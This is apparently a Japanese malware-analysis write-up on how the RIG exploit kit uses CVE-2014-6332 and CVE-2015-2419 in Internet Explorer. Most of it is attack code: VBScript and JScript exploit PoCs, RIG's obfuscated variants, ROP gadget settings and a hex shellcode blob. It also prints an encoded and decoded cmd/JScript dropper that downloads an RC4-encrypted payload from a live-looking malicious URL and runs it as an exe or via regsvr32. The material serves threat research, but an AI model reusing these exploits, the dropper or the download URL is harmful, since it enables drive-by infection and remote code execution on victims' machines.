>OleAut32.dll in OLE in Microsoft Windows Server 2003 SP2, Windows Vista SP2, Windows Server 2008 SP2 and R2 SP1, Windows 7 SP1, Windows 8, Windows 8.1, Windows Server 2012 Gold and R2, and Windows RT Gold and 8.1 allows remote attackers to execute arbitrary code via a crafted web site, as demonstrated by an array-redimensioning attempt that triggers improper handling of a size value in the SafeArrayDimen function, aka "Windows OLE Automation Array Remote Code Execution Vulnerability." 

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6332

#### exploit(POC)
```vb
function Exploit()
	Exploit = False
	For i = 0 To 400
		asize = asize + incsize
		If Trigger() = True Then
			Exploit = True
			Exit For
		End If
	Next
end function
function Trigger()
	On Error Resume Next
	Trigger = False
	olapPos = asize + 2
	ofnumele = asize + &h8000000
	
	redim Preserve arrX(asize*2+1)
	redim Preserve arrX(asize)
	redim arrY(asize)
	redim Preserve arrX(ofnumele)
	
	typev = 1
	arrY(0) = 1.123456789012345678901234567890
	
	If (IsObject(arrX(olapPos-1)) = False) Then
		If (VarType(arrX(olapPos-1)) <> 0) Then
			If (IsObject(arrX(olapPos)) = False) Then
				typev = VarType(arrX(olapPos))
			End If
		End If
	End If
	
	arrY(0) = 0.0
	If (typev = &h2f66) And (VarType(arrX(olapPos)) = 0) Then
		Trigger = True
	Else
		redim Preserve arrX(asize)
	End If
end function
```

* https://gist.github.com/worawit/1213febe36aa8331e092
* https://www.exploit-db.com/exploits/35229/

#### How to use in RIG
CVE-2016-0189と併用して利用されるため, 実行されるコマンドはほとんど一緒です. いくつかの変数の値が異なっていました.

##### exploit
```vb
      function Create()
          On Error Resume Next
		  dim i
		  Create=False
		  For i = 0 To 400
			If erfot()=True Then
			   Create=True
			   Exit For
			End If
		  Next
      end function

      function erfot()
		On Error Resume Next
		dim type1,type2,type3
		erfot=False
		a0=a0+a3
		a1=a0+2
		a2=a0+&h8000000
		redim  Preserve zdf(a0)
		redim  vti(a0)
		redim  Preserve zdf(a2)
		type1=1
		vti(0)=1.123456789012345678901234567890
		zdf(a0)=10
               If(IsObject(zdf(a1-1)) = False) Then
		   if(vartype(zdf(a1-1))<>0)  Then
			  If(IsObject(zdf(a1)) = False) Then
				  type1=VarType(zdf(a1))
			  end if
		   end if
		end if

		If(type1=&h2f66) Then
			  erfot=True
		End If
        
		If(type1=&hB9AD) Then
			  erfot=True
			  win9x=1
		End If

		redim  Preserve zdf(a0)
       end function
```

#### execute
```vb
		Set w=CreateObject("WScript.Shell")
		key="gexywoaxor"
		url="http://top.associatedorthopaedicsva.com/?wendsday=kulture.89pp107.406l7j6x4&oq=2Fo_EuL-NVPgOyi0eHf1A1m4dfUVwU96GpikCEn0WfhpCG9B2LUQNM9qKQSfE4&q=wX7QMvXcJwDQCIbGMvrESLtENknQA0KK2Iv2_dqyEoH9eGnihNzUSkrz6B2aCm&policy=choko&ct=kulture&car=1801" 
		uas=Navigator.UserAgent
		sdfa="WQ63WQ6DWQ64WQ2EWQ65WQ78WQ65WQ20WQ2FWQ71WQ20WQ2FWQ63WQ20WQ63WQ64WQ20WQ2FWQ64WQ20WQ22WQ25WQ74WQ6DWQ70WQ25WQ22WQ20WQ26WQ26WQ20WQ65WQ63WQ68WQ6FWQ20WQ66WQ75WQ6EWQ63WQ74WQ69WQ6FWQ6EWQ20WQ4FWQ28WQ6CWQ29WQ7BWQ76WQ61WQ72WQ20WQ77WQ3DWQ22WQ70WQ6FWQ77WQ22WQ2CWQ6AWQ3DWQ33WQ37WQ2DWQ31WQ3BWQ72WQ65WQ74WQ75WQ72WQ6EWQ20WQ41WQ2EWQ72WQ6FWQ75WQ6EWQ64WQ28WQ28WQ41WQ5BWQ77WQ5DWQ28WQ6AWQ2CWQ6CWQ2BWQ31WQ29WQ2DWQ41WQ2EWQ72WQ61WQ6EWQ64WQ6FWQ6DWQ28WQ29WQ2AWQ41WQ5BWQ77WQ5DWQ28WQ6AWQ2CWQ6CWQ29WQ29WQ29WQ2EWQ74WQ6FWQ53WQ74WQ72WQ69WQ6EWQ67WQ28WQ6AWQ29WQ5BWQ22WQ73WQ6CWQ69WQ63WQ65WQ22WQ5DWQ28WQ31WQ29WQ7DWQ3BWQ66WQ75WQ6EWQ63WQ74WQ69WQ6FWQ6EWQ20WQ56WQ28WQ6BWQ29WQ7BWQ76WQ61WQ72WQ20WQ79WQ3DWQ61WQ28WQ65WQ2BWQ22WQ2EWQ22WQ2BWQ65WQ2BWQ22WQ52WQ65WQ71WQ75WQ65WQ73WQ74WQ2EWQ35WQ2EWQ31WQ22WQ29WQ3BWQ79WQ2EWQ73WQ65WQ74WQ50WQ72WQ6FWQ78WQ79WQ28WQ6EWQ29WQ3BWQ79WQ2EWQ6FWQ70WQ65WQ6EWQ28WQ22WQ47WQ45WQ54WQ22WQ2CWQ6BWQ28WQ31WQ29WQ2CWQ31WQ29WQ3BWQ79WQ2EWQ4FWQ70WQ74WQ69WQ6FWQ6EWQ28WQ6EWQ29WQ3DWQ6BWQ28WQ32WQ29WQ3BWQ79WQ5BWQ22WQ73WQ65WQ6EWQ64WQ22WQ5DWQ28WQ29WQ3BWQ79WQ2EWQ2FWQ2AWQ41WQ42WQ43WQ44WQ45WQ2AWQ2FWQ57WQ61WQ69WQ74WQ46WQ6FWQ72WQ52WQ65WQ73WQ70WQ6FWQ6EWQ73WQ65WQ28WQ29WQ3BWQ69WQ66WQ28WQ32WQ30WQ30WQ3DWQ3DWQ79WQ2EWQ73WQ74WQ61WQ74WQ75WQ73WQ29WQ72WQ65WQ74WQ75WQ72WQ6EWQ20WQ5FWQ28WQ79WQ2EWQ72WQ65WQ73WQ70WQ6FWQ6EWQ73WQ65WQ54WQ65WQ78WQ74WQ2CWQ6BWQ28WQ6EWQ29WQ29WQ7DWQ3BWQ66WQ75WQ6EWQ63WQ74WQ69WQ6FWQ6EWQ20WQ5FWQ28WQ6BWQ2CWQ65WQ29WQ7BWQ66WQ6FWQ72WQ28WQ76WQ61WQ72WQ20WQ6CWQ3DWQ30WQ2CWQ6EWQ2CWQ63WQ3DWQ5BWQ5DWQ2CWQ46WQ3DWQ32WQ35WQ36WQ2DWQ31WQ2CWQ53WQ3DWQ53WQ74WQ72WQ69WQ6EWQ67WQ2CWQ71WQ3DWQ5BWQ5DWQ2CWQ62WQ3DWQ30WQ3BWQ32WQ35WQ36WQ5EWQ3EWQ62WQ3BWQ62WQ2BWQ2BWQ29WQ63WQ5BWQ62WQ5DWQ3DWQ62WQ3BWQ66WQ6FWQ72WQ28WQ62WQ3DWQ30WQ3BWQ32WQ35WQ36WQ5EWQ3EWQ62WQ3BWQ62WQ2BWQ2BWQ29WQ6CWQ3DWQ6CWQ2BWQ63WQ5BWQ62WQ5DWQ2BWQ65WQ2EWQ63WQ68WQ61WQ72WQ43WQ6FWQ64WQ65WQ41WQ74WQ28WQ62WQ25WQ65WQ2EWQ6CWQ65WQ6EWQ67WQ74WQ68WQ29WQ5EWQ26WQ46WQ2CWQ6EWQ3DWQ63WQ5BWQ62WQ5DWQ2CWQ63WQ5BWQ62WQ5DWQ3DWQ63WQ5BWQ6CWQ5DWQ2CWQ63WQ5BWQ6CWQ5DWQ3DWQ6EWQ3BWQ66WQ6FWQ72WQ28WQ76WQ61WQ72WQ20WQ70WQ3DWQ6CWQ3DWQ62WQ3DWQ30WQ3BWQ70WQ5EWQ3CWQ6BWQ2EWQ6CWQ65WQ6EWQ67WQ74WQ68WQ3BWQ70WQ2BWQ2BWQ29WQ62WQ3DWQ62WQ2BWQ31WQ5EWQ26WQ46WQ2CWQ6CWQ3DWQ6CWQ2BWQ63WQ5BWQ62WQ5DWQ5EWQ26WQ46WQ2CWQ6EWQ3DWQ63WQ5BWQ62WQ5DWQ2CWQ63WQ5BWQ62WQ5DWQ3DWQ63WQ5BWQ6CWQ5DWQ2CWQ63WQ5BWQ6CWQ5DWQ3DWQ6EWQ2CWQ71WQ2EWQ70WQ75WQ73WQ68WQ28WQ53WQ2EWQ66WQ72WQ6FWQ6DWQ43WQ68WQ61WQ72WQ43WQ6FWQ64WQ65WQ28WQ6BWQ2EWQ63WQ68WQ61WQ72WQ43WQ6FWQ64WQ65WQ41WQ74WQ28WQ70WQ29WQ5EWQ5EWQ63WQ5BWQ63WQ5BWQ62WQ5DWQ2BWQ63WQ5BWQ6CWQ5DWQ5EWQ26WQ46WQ5DWQ29WQ29WQ3BWQ72WQ65WQ74WQ75WQ72WQ6EWQ20WQ71WQ2EWQ6AWQ6FWQ69WQ6EWQ28WQ22WQ22WQ29WQ7DWQ3BWQ74WQ72WQ79WQ7BWQ76WQ61WQ72WQ20WQ75WQ3DWQ57WQ53WQ63WQ72WQ69WQ70WQ74WQ2CWQ6FWQ3DWQ22WQ4FWQ62WQ6AWQ65WQ63WQ74WQ22WQ2CWQ41WQ3DWQ4DWQ61WQ74WQ68WQ2CWQ61WQ3DWQ46WQ75WQ6EWQ63WQ74WQ69WQ6FWQ6EWQ28WQ22WQ62WQ22WQ2CWQ22WQ72WQ65WQ74WQ75WQ72WQ6EWQ20WQ75WQ2EWQ43WQ72WQ65WQ61WQ74WQ65WQ22WQ2BWQ6FWQ2BWQ22WQ28WQ62WQ29WQ22WQ29WQ3BWQ50WQ3DWQ28WQ22WQ22WQ2BWQ75WQ29WQ2EWQ73WQ70WQ6CWQ69WQ74WQ28WQ22WQ20WQ22WQ29WQ5BWQ31WQ5DWQ2CWQ4DWQ3DWQ22WQ69WQ6EWQ64WQ65WQ78WQ4FWQ66WQ22WQ2CWQ71WQ3DWQ61WQ28WQ50WQ2BWQ22WQ69WQ6EWQ67WQ2EWQ46WQ69WQ6CWQ65WQ53WQ79WQ73WQ74WQ65WQ6DWQ22WQ2BWQ6FWQ29WQ2CWQ6DWQ3DWQ75WQ2EWQ41WQ72WQ67WQ75WQ6DWQ65WQ6EWQ74WQ73WQ2CWQ65WQ3DWQ22WQ57WQ69WQ6EWQ48WQ54WQ54WQ50WQ22WQ2CWQ5AWQ3DWQ22WQ63WQ6DWQ64WQ22WQ2CWQ6AWQ3DWQ61WQ28WQ22WQ57WQ22WQ2BWQ50WQ2BWQ22WQ2EWQ53WQ68WQ65WQ6CWQ6CWQ22WQ29WQ2CWQ73WQ3DWQ61WQ28WQ22WQ41WQ44WQ4FWQ44WQ42WQ2EWQ53WQ74WQ72WQ65WQ61WQ6DWQ22WQ29WQ2CWQ78WQ3DWQ4FWQ28WQ38WQ29WQ2BWQ22WQ2EWQ22WQ2CWQ70WQ3DWQ22WQ65WQ78WQ65WQ22WQ2CWQ6EWQ3DWQ30WQ2CWQ4BWQ3DWQ75WQ5BWQ50WQ2BWQ22WQ46WQ75WQ6CWQ6CWQ4EWQ61WQ6DWQ65WQ22WQ5DWQ2CWQ45WQ3DWQ22WQ2EWQ22WQ2BWQ70WQ3BWQ73WQ2EWQ54WQ79WQ70WQ65WQ3DWQ32WQ3BWQ73WQ2EWQ43WQ68WQ61WQ72WQ73WQ65WQ74WQ3DWQ22WQ69WQ73WQ6FWQ2DWQ38WQ38WQ35WQ39WQ2DWQ31WQ22WQ3BWQ73WQ2EWQ4FWQ70WQ65WQ6EWQ28WQ29WQ3BWQ74WQ72WQ79WQ7BWQ76WQ3DWQ56WQ28WQ6DWQ29WQ7DWQ63WQ61WQ74WQ63WQ68WQ28WQ57WQ29WQ7BWQ76WQ3DWQ56WQ28WQ6DWQ29WQ7DWQ3BWQ64WQ3DWQ76WQ2EWQ63WQ68WQ61WQ72WQ43WQ6FWQ64WQ65WQ41WQ74WQ28WQ30WQ32WQ37WQ2BWQ76WQ5BWQ4DWQ5DWQ28WQ22WQ50WQ45WQ5CWQ78WQ30WQ30WQ5CWQ78WQ30WQ30WQ22WQ29WQ29WQ3BWQ73WQ2EWQ57WQ72WQ69WQ74WQ65WQ54WQ65WQ78WQ74WQ28WQ76WQ29WQ3BWQ69WQ66WQ28WQ33WQ31WQ5EWQ3CWQ64WQ29WQ7BWQ76WQ61WQ72WQ20WQ7AWQ3DWQ31WQ3BWQ78WQ2BWQ3DWQ22WQ64WQ6CWQ6CWQ22WQ7DWQ65WQ6CWQ73WQ65WQ20WQ78WQ2BWQ3DWQ70WQ3BWQ73WQ5BWQ22WQ73WQ61WQ76WQ65WQ74WQ6FWQ66WQ69WQ6CWQ65WQ22WQ5DWQ28WQ78WQ2CWQ32WQ29WQ3BWQ73WQ2EWQ43WQ6CWQ6FWQ73WQ65WQ28WQ29WQ3BWQ66WQ3DWQ22WQ72WQ22WQ3BWQ7AWQ5EWQ26WQ5EWQ26WQ28WQ78WQ3DWQ22WQ72WQ65WQ67WQ73WQ76WQ22WQ2BWQ66WQ2BWQ33WQ32WQ2BWQ45WQ2BWQ22WQ20WQ2FWQ73WQ20WQ22WQ2BWQ78WQ29WQ3BWQ6AWQ2EWQ72WQ75WQ6EWQ28WQ5AWQ2BWQ45WQ2BWQ22WQ20WQ2FWQ63WQ20WQ22WQ2BWQ78WQ2CWQ30WQ29WQ7DWQ63WQ61WQ74WQ63WQ68WQ28WQ5FWQ78WQ29WQ7BWQ7DWQ3BWQ71WQ2EWQ44WQ65WQ6CWQ65WQ74WQ65WQ66WQ69WQ6CWQ65WQ28WQ4BWQ29WQ3BWQ3EWQ6FWQ33WQ32WQ2EWQ74WQ6DWQ70WQ20WQ26WQ26WQ20WQ73WQ74WQ61WQ72WQ74WQ20WQ77WQ73WQ63WQ72WQ69WQ70WQ74WQ20WQ2FWQ2FWQ42WQ20WQ2FWQ2FWQ45WQ3AWQ4AWQ53WQ63WQ72WQ69WQ70WQ74WQ20WQ6FWQ33WQ32WQ2EWQ74WQ6DWQ70WQ20WQ22"
		sert = Replace(sdfa, "WQ", "%")
		str=UnEscape(sert)&key&Chr(34)&Chr(32)&Chr(34)&url&Chr(34)&Chr(32)&Chr(34)&uas&Chr(34)
		w.Run str,0
```

デコードすると以下のようになります.

```vb
cmd.exe /q /c cd /d "%tmp%" && echo function O(l){var w="pow",j=37-1;return A.round((A[w](j,l+1)-A.random()*A[w](j,l))).toString(j)["slice"](1)};function V(k){var y=a(e+"."+e+"Request.5.1");y.setProxy(n);y.open("GET",k(1),1);y.Option(n)=k(2);y["send"]();y./*ABCDE*/WaitForResponse();if(200==y.status)return _(y.responseText,k(n))};function _(k,e){for(var l=0,n,c=[],F=256-1,S=String,q=[],b=0;256^>b;b++)c[b]=b;for(b=0;256^>b;b++)l=l+c[b]+e.charCodeAt(b%e.length)^&F,n=c[b],c[b]=c[l],c[l]=n;for(var p=l=b=0;p^<k.length;p++)b=b+1^&F,l=l+c[b]^&F,n=c[b],c[b]=c[l],c[l]=n,q.push(S.fromCharCode(k.charCodeAt(p)^^c[c[b]+c[l]^&F]));return q.join("")};try{var u=WScript,o="Object",A=Math,a=Function("b","return u.Create"+o+"(b)");P=(""+u).split(" ")[1],M="indexOf",q=a(P+"ing.FileSystem"+o),m=u.Arguments,e="WinHTTP",Z="cmd",j=a("W"+P+".Shell"),s=a("ADODB.Stream"),x=O(8)+".",p="exe",n=0,K=u[P+"FullName"],E="."+p;s.Type=2;s.Charset="iso-8859-1";s.Open();try{v=V(m)}catch(W){v=V(m)};d=v.charCodeAt(027+v[M]("PE\x00\x00"));s.WriteText(v);if(31^<d){var z=1;x+="dll"}else x+=p;s["savetofile"](x,2);s.Close();f="r";z^&^&(x="regsv"+f+32+E+" /s "+x);j.run(Z+E+" /c "+x,0)}catch(_x){};q.Deletefile(K);>o32.tmp && start wscript //B //E:JScript o32.tmp "gexywoaxor" "http://top.associatedorthopaedicsva.com/?wendsday=kulture.89pp107.406l7j6x4&oq=2Fo_EuL-NVPgOyi0eHf1A1m4dfUVwU96GpikCEn0WfhpCG9B2LUQNM9qKQSfE4&q=wX7QMvXcJwDQCIbGMvrESLtENknQA0KK2Iv2_dqyEoH9eGnihNzUSkrz6B2aCm&policy=choko&ct=kulture&car=1801" "Navigator.UserAgent"
```

----

### CVE-2015-2419
>JScript 9 in Microsoft Internet Explorer 10 and 11 allows remote attackers to execute arbitrary code or cause a denial of service (memory corruption) via a crafted web site, aka "JScript9 Memory Corruption Vulnerability." 

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2419

#### exploit(POC)
>### CVE-2015-2419 Vulnerability Details
>
>CVE-2015-2419 is a double free vulnerability in jscript9’s native JSON APIs that was patched in July with MS15-065. Specifically, the vulnerability exists in the way that JSON.stringify parses deeply nested JSON data as follows. The attacker’s chosen arguments to JSON.stringify are reproduced in their entirety in the appendix.

https://www.fireeye.com/blog/threat-research/2015/08/cve-2015-2419_inte.html

```js
Il1I4['prototype'].yc =
    function(a) {
        if (!a.ma(!1)) throw new Error(3);
        a.kb(!1);
        a.ib(!1);
        JSON["stringify"](this.Pc, this.uc);
        a.ob(!1);
        CollectGarbage()
    };
```

#### How to use in RIG
全体的に読みにくく書かれています. FireEyeの記事で書かれていたjsより, 少し難読化されていました.

##### exploit
```js
    function Il1IBa() {
        this.M = !1;
        this.D = window;
        this.gd = JSON;
        this.Da = String;
        this.Va = Math;
        this.u = Error;
        this.Z = CollectGarbage;
        this.Ga = Uint32Array;
        this.cb = Uint8Array;
        this.fa = ArrayBuffer;
        this.ga = Array;
        this.ra = Object;
    }


    Il1I4.prototype.yc = function (a) {
        if (!a.ma(!1)) {
            throw new this.scope.u(this.scope.qd);
        }
        a.kb(!1);
        a.ib(!1);
        this.scope.gd[this.scope.Td](this.Pc, this.uc);
        a.ob(!1);
        this.scope.Z();
    }
```


FireEyeの記事のAppendix III

```js
{"ll":"length","l":"charCodeAt","I":"fromCharCode","Il":"floor","IlI":"random","lI":"stringify","lII":"location","II":"host","llI":"number","lll":"ScriptEngineBuildVersion","lIl":"ScriptEngineMajorVersion","IIl":"ScriptEngineMinorVersion","Ill":"setInterval","III":"clearInterval","lIlI":"ur0pqm8kx”,"IlII":"http://","lllI":","lIIl":"u","IlIl":"x","llll":"xexec","Illl":"EAX","lIII":"ECX","IIIl":"EDI","IllI":"ESP","IIlI":"XCHG EAX,ESP","IIll":"MOV [ECX+0C],EAX","llIl":"CALL [EAX+4C]","llII":"MOV EDI,[EAX+90]","IIII":"a","lIll":"kernel32.dll","lIlll":"virtualprotect","IIIlI":11,"lIIll":0,"lllll":17905,"lIllI":500,"llIIl":16,"IlIII":0,"IIIll":1,"IIlII":2,"lIlII":3,"IllIl":4,"lllIl":5,"IIlll":8,"lIlIl":9,"lIIIl":10,"IllII":11,"lIIlI":12,"IlIll":16,"IIIIl":24,"IlIlI":100,"IIIII":1,"llIlI":2,"lllII":2147483647,"llIll":4294967295,"IIllI":255,"llIII":256,"lIIII":65535,"IIlIl":16776960,"IlIIl":16777215,"llllI":4294967040,"IlllIl":4294901760,"Illll":4278190080,"IlllI":65280,"llllIl":16711680,"lllIlI":19,"llIIII":4096,"IIIIIl":4294963200,"IIlllI":4095,"llIIlI":14598366,"IIllIl":48,"llIIll":32,"IIIllI":15352,"llIlll":85,"lIIIII":4096,"IllllI":400,"lIIlII":311296000,"IIIlIl":61440,"llllII":24,"IIIIll":32,"IlIlIl":17239,"lllllI":15,"IllIll":256,"llIllI":76,"lllIll":144,"lIlIIl":17416,"IlIIll":65536,"IIlIll":100000,"lIlllI":28,"IIlIlI":60,"lIlIII":44,"IIIlll":28,"IllIII":128,"lllIIl":20,"lIIIll":12,"lIlIlI":16,"IIlIIl":4,"IlIIIl":2,"lIllll":110,"IIIlII":64,"IllIlI":-,"lIIIIl":0,"IllIlII":1,"lIIlll":2,"IlIlll":3,"IIlIII":4,"lIllIl":5,"IIllll":7,"IIIIII":9,"lIlIll":10,"IlllII":11,"lIllII":12,"Illlll":-2146823286,"lIIIlI":[148,195],"lIIlIl":[137,65,12,195],"IIllII":122908,122236,125484,2461125,208055,1572649,249826,271042,98055,62564,162095,163090,340146,172265,163058,170761,258290,166489,245298,172955,82542],"IlIIII":150104,149432,152680,3202586,214836,3204663,361185,285227,103426,599295,365261,226292,410596,180980,226276,179716,320389,175621,307381,792144,183476],"IIIIlI":48,"IIIlIlI":57,"lllIII":65,"IllIIl":90,"IlIlII":97,"llllll":122,"IlIllI":16640,"llIlIl":23040,"IlIIlI":4259840,"lIIIIlI":5898240,"llIIIl":1090519040,"llIIIII":1509949440,"IlIIIlI":32,"IIIlllI":8192,"lllllII":2097152,"IIIllll":536870912,"llIlII":"17416":4080636,"17496":4080636,"17631":4084748,"17640":4084748,"17689":4080652,"17728":4088844,"17801":4088844,"17840":4088840,"17905":4088840
```

RIGのペイロードでは"l"を"ER"に変換しています.

```js
n = '{"ERER":"EReYTgth","ER":"charCodeAt","I":"fromCharCode","IER":"fERoor","IERI":"raYTdom","ERI":"striYTgify","ERII":"ERocatioYT","II":"host","ERERI":"YTumber","ERERER":"ScriptEYTgiYTeBuiERdVersioYT","ERIER":"ScriptEYTgiYTeMajorVersioYT","IIER":"ScriptEYTgiYTeMiYTorVersioYT","IERER":"setIYTtervaER","III":"cERearIYTtervaER","ERIERI":"ur0pqm8kx","IERII":"http://","ERERERI":"ERocaERhost/","ERIIER":"u","IERIER":"x","ERERERER":"xexec","IERERER":"EAX","ERIII":"ECX","IIIER":"EDI","IERERI":"ESP","IIERI":"XCHG EAX,ESP","IIERER":"MOV [ECX+0C],EAX","ERERIER":"CAERER [EAX+4C]","ERERII":"MOV EDI,[EAX+90]","IIII":"a","ERIERER":"kerYTeER32.dERER","ERIERERER":"virtuaERprotect","IIIERI":11,"ERIIERER":0,"ERERERERER":17905,"ERIERERI":500,"ERERIIER":16,"IERIII":0,"IIIERER":1,"IIERII":2,"ERIERII":3,"IERERIER":4,"ERERERIER":5,"IIERERER":8,"ERIERIER":9,"ERIIIER":10,"IERERII":11,"ERIIERI":12,"IERIERER":16,"IIIIER":24,"IERIERI":100,"IIIII":1,"ERERIERI":2,"ERERERII":2147483647,"ERERIERER":4294967295,"IIERERI":255,"ERERIII":256,"ERIIII":65535,"IIERIER":16776960,"IERIIER":16777215,"ERERERERI":4294967040,"IERERERIER":4294901760,"IERERERER":4278190080,"IERERERI":65280,"ERERERERIER":16711680,"ERERERIERI":19,"ERERIIII":4096,"IIIIIER":4294963200,"IIERERERI":4095,"ERERIIERI":14598366,"IIERERIER":48,"ERERIIERER":32,"IIIERERI":15352,"ERERIERERER":85,"ERIIIII":4096,"IERERERERI":400,"ERIIERII":311296000,"IIIERIER":61440,"ERERERERII":24,"IIIIERER":32,"IERIERIER":17239,"ERERERERERI":15,"IERERIERER":256,"ERERIERERI":76,"ERERERIERER":144,"ERIERIIER":17416,"IERIIERER":65536,"IIERIERER":100000,"ERIERERERI":28,"IIERIERI":60,"ERIERIII":44,"IIIERERER":28,"IERERIII":128,"ERERERIIER":20,"ERIIIERER":12,"ERIERIERI":16,"IIERIIER":4,"IERIIIER":2,"ERIERERERER":110,"IIIERII":64,"IERERIERI":-1,"ERIIIIER":0,"IERERIERII":1,"ERIIERERER":2,"IERIERERER":3,"IIERIII":4,"ERIERERIER":5,"IIERERERER":7,"IIIIII":9,"ERIERIERER":10,"IERERERII":11,"ERIERERII":12,"IERERERERER":-2146823286,"ERIIIERI":[148,195],"ERIIERIER":[137,65,12,195],"IIERERII":[122908,122236,125484,2461125,208055,1572649,249826,271042,98055,62564,162095,163090,340146,172265,163058,170761,258290,166489,245298,172955,82542],"IERIIII":[150104,149432,152680,3202586,214836,3204663,361185,285227,103426,599295,365261,226292,410596,180980,226276,179716,320389,175621,307381,792144,183476],"IIIIERI":48,"IIIERIERI":57,"ERERERIII":65,"IERERIIER":90,"IERIERII":97,"ERERERERERER":122,"IERIERERI":16640,"ERERIERIER":23040,"IERIIERI":4259840,"ERIIIIERI":5898240,"ERERIIIER":1090519040,"ERERIIIII":1509949440,"IERIIIERI":32,"IIIERERERI":8192,"ERERERERERII":2097152,"IIIERERERER":536870912,"ERERIERII":{"17416":4080636,"17496":4080636,"17631":4084748,"17640":4084748,"17689":4080652,"17728":4088844,"17801":4088844,"17840":4088840,"17905":4088840}}'.replace(/ER/g, "l").replace(/YT/g, "n"), 
```

##### shellcode
###### 1. Shellcode Decryption Stage
RC4で暗号化され, base64でエンコードされています.

```
this.scope.Ua = "ur0pqm8kx" = RC4 key
Il1IY() = base64
```

```js
try {
            var a = unescape(retdfg3("EB125831C966B96D05498034088485C975F7FFE0E8E9FFFFFFD10D61074028D7D5D3B544E00FC4B40FC4880FC4880F840F840FDC9C0D5C87C4B80FD4FC855E0FFEA4855BB54D0F83855C05BCC7F6E1E5F19805FC8FF7F7C584F1970FC6A0855C8B3380CC0FD698855E8798066F8D074380C5BFCE9CF84B09C174D409F928D3B5443D95848484772FE243C15C858543C128C0848484D4D4D4C4D4CCD4D46F8AD47B57DBDDDF4564870744824D476C697B7B7BE7E9E0AAE1FCE1A4ABF5A4ABE7A4E7E0A4ABE0A4A6A1F0E9F4A1A6A4A2A2A4E1E7ECEBA4E2F1EAE7F0EDEBEAA4CBACE8ADFFF2E5F6A4F3B9A6F4EBF3A6A8EEB9B7B3A9B5BFF6E1F0F1F6EAA4C5AAF6EBF1EAE0ACACC5DFF3D9ACEEA8E8AFB5ADA9C5AAF6E5EAE0EBE9ACADAEC5DFF3D9ACEEA8E8ADADADAAF0EBD7F0F6EDEAE3ACEEADDFA6F7E8EDE7E1A6D9ACB5ADF9BFE2F1EAE7F0EDEBEAA4D2ACEFADFFF2E5F6A4FDB9E5ACE1AFA6AAA6AFE1AFA6D6E1F5F1E1F7F0AAB1AAB5A6ADBFFDAAF7E1F0D4F6EBFCFDACEAADBFFDAAEBF4E1EAACA6C3C1D0A6A8EFACB5ADA8B5ADBFFDAACBF4F0EDEBEAACEAADB9EFACB6ADBFFDDFA6F7E1EAE0A6D9ACADBFFDAAABAEC5C6C7C0C1AEABD3E5EDF0C2EBF6D6E1F7F4EBEAF7E1ACADBFEDE2ACB6B4B4B9B9FDAAF7F0E5F0F1F7ADF6E1F0F1F6EAA4DBACFDAAF6E1F7F4EBEAF7E1D0E1FCF0A8EFACEAADADF9BFE2F1EAE7F0EDEBEAA4DBACEFA8E1ADFFE2EBF6ACF2E5F6A4E8B9B4A8EAA8E7B9DFD9A8C2B9B6B1B2A9B5A8D7B9D7F0F6EDEAE3A8F5B9DFD9A8E6B9B4BFB6B1B2DABAE6BFE6AFAFADE7DFE6D9B9E6BFE2EBF6ACE6B9B4BFB6B1B2DABAE6BFE6AFAFADE8B9E8AFE7DFE6D9AFE1AAE7ECE5F6C7EBE0E1C5F0ACE6A1E1AAE8E1EAE3F0ECADDAA2C2A8EAB9E7DFE6D9A8E7DFE6D9B9E7DFE8D9A8E7DFE8D9B9EABFE2EBF6ACF2E5F6A4F4B9E8B9E6B9B4BFF4DAB8EFAAE8E1EAE3F0ECBFF4AFAFADE6B9E6AFB5DAA2C2A8E8B9E8AFE7DFE6D9DAA2C2A8EAB9E7DFE6D9A8E7DFE6D9B9E7DFE8D9A8E7DFE8D9B9EAA8F5AAF4F1F7ECACD7AAE2F6EBE9C7ECE5F6C7EBE0E1ACEFAAE7ECE5F6C7EBE0E1C5F0ACF4ADDADAE7DFE7DFE6D9AFE7DFE8D9DAA2C2D9ADADBFF6E1F0F1F6EAA4F5AAEEEBEDEAACA6A6ADF9BFF0F6FDFFF2E5F6A4F1B9D3D7E7F6EDF4F0A8EBB9A6CBE6EEE1E7F0A6A8C5B9C9E5F0ECA8E5B9C2F1EAE7F0EDEBEAACA6E6A6A8A6F6E1F0F1F6EAA4F1AAC7F6E1E5F0E1A6AFEBAFA6ACE6ADA6ADBFD4B9ACA6A6AFF1ADAAF7F4E8EDF0ACA6A4A6ADDFB5D9A8C9B9A6EDEAE0E1FCCBE2A6A8F5B9E5ACD4AFA6EDEAE3AAC2EDE8E1D7FDF7F0E1E9A6AFEBADA8E9B9F1AAC5F6E3F1E9E1EAF0F7A8E1B9A6D3EDEACCD0D0D4A6A8DEB9A6E7E9E0A6A8EEB9E5ACA6D3A6AFD4AFA6AAD7ECE1E8E8A6ADA8F7B9E5ACA6C5C0CBC0C6AAD7F0F6E1E5E9A6ADA8FCB9CBACBCADAFA6AAA6A8F4B9A6E1FCE1A6A8EAB9B4A8CFB9F1DFD4AFA6C2F1E8E8CAE5E9E1A6D9A8C1B9A6AAA6AFF4BFF7AAD0FDF4E1B9B6BFF7AAC7ECE5F6F7E1F0B9A6EDF7EBA9BCBCB1BDA9B5A6BFF7AACBF4E1EAACADBFF0F6FDFFF2B9D2ACE9ADF9E7E5F0E7ECACD3ADFFF2B9D2ACE9ADF9BFE0B9F2AAE7ECE5F6C7EBE0E1C5F0ACB4B6B3AFF2DFC9D9ACA6D4C1D8FCB4B4D8FCB4B4A6ADADBFF7AAD3F6EDF0E1D0E1FCF0ACF2ADBFEDE2ACB7B5DAB8E0ADFFF2E5F6A4FEB9B5BFFCAFB9A6E0E8E8A6F9E1E8F7E1A4FCAFB9F4BFF7DFA6F7E5F2E1F0EBE2EDE8E1A6D9ACFCA8B6ADBFF7AAC7E8EBF7E1ACADBFE2B9A6F6A6BFFEDAA2DAA2ACFCB9A6F6E1E3F7F2A6AFE2AFB7B6AFC1AFA6A4ABF7A4A6AFFCADBFEEAAF6F1EAACDEAFC1AFA6A4ABE7A4A6AFFCA8B4ADF9E7E5F0E7ECACDBFCADFFF9BFF5AAC0E1E8E1F0E1E2EDE8E1ACCFADBFBAEBB7B6AAF0E9F4A4A2A2A4F7F0E5F6F0A4F3F7E7F6EDF4F0A4ABABC6A4ABABC1BECED7E7F6EDF4F0A4EBB7B6AAF0E9F4A4A6" + hvhfghdyer(_url, _key)));
            this.ka = Il1I0(a);
            var b = Il1IDa(this.scope.Ua, Il1IY("c17UA/vZT1HDBcAlM7Eytz4w/qmqQEqO"));
            this.Ib = Il1I0(b);
